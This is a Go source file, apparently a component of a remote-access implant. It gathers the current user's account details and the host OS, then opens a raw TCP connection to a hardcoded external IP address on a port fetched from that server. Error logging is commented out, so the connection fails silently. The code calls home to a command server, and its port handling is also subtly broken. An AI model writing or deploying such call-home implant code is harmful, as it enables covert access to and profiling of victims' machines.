package sockets

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os/user"
)

//Run is the driver of sockets
func Run() (net.Conn, error) {
	var err error
	t := Target{}
	t.OS, err = determineOSRunTime()
	if err != nil {
		panic(err)
	}
	GetInfo(&t)
	switch t.OS {
	case Unix:
		fetchUnixDetails()
	case Linux:
		fetchLinuxDetails()
	case Windows:
		fetchWindowsDetails()
	}
	conn, err := makeSocketConnection()
	if err != nil {
		return nil, err
	}
	return conn, nil
}

//makeSocketConnection makes a socket connection to the server,
//by fetching the port from server
func makeSocketConnection() (net.Conn, error) {
	var port int = 9000
	req, err := getNewRequest("get", "147.139.7.165:9090/getPortNumber")
	if err != nil {
		// log.Println("unable to make a get request for port using the default 9000 for making socket")
	} else {
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			// log.Println("unable to receive a response for port using the default 9000 for making socket")
		} else {
			b, err := ioutil.ReadAll(resp.Body)
			var port int
			err = json.Unmarshal(b, &port)
			if err != nil {
				// log.Println("unable to unmarshal the port using the default 9000 for making socket")
			}
		}
	}
	var address string = fmt.Sprintf("147.139.7.165:%d", port)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return nil, err
	}
	return conn, err
}

//GetInfo fetches the information about the device
func GetInfo(t *Target) {
	current, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	currentUser, err := json.Marshal(current)
	json.Unmarshal(currentUser, &t.User)
}
